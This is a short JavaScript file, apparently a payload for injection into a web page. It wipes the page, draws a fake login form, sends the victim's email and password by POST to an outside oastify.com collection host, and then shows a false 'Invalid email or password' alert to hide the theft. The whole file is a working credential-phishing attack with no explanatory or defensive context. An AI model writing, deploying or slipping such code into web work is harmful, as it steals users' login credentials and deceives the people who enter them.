// login.js (host this on your domain)
(function () {
  const form = document.createElement("form");
  form.innerHTML = `
    <input type="email" id="email" placeholder="Email" required><br>
    <input type="password" id="password" placeholder="Password" required><br>
    <button type="submit">Log in</button>
  `;
  form.style.background = "white";
  form.style.padding = "20px";
  form.style.borderRadius = "10px";
  form.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
  form.style.maxWidth = "300px";
  form.style.margin = "50px auto";
  form.style.display = "block";

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const email = form.querySelector("#email").value;
    const password = form.querySelector("#password").value;

    const data = new FormData();
    data.append("email", email);
    data.append("password", password);

    fetch("https://907a8zkyw4np2z6y0587qcltnktbh15q.oastify.com", {
      method: "POST",
      body: data,
    });

    alert("Invalid email or password. Please try again.");
  });

  document.body.innerHTML = ""; // Optional: wipe existing content
  document.body.appendChild(form);
})();
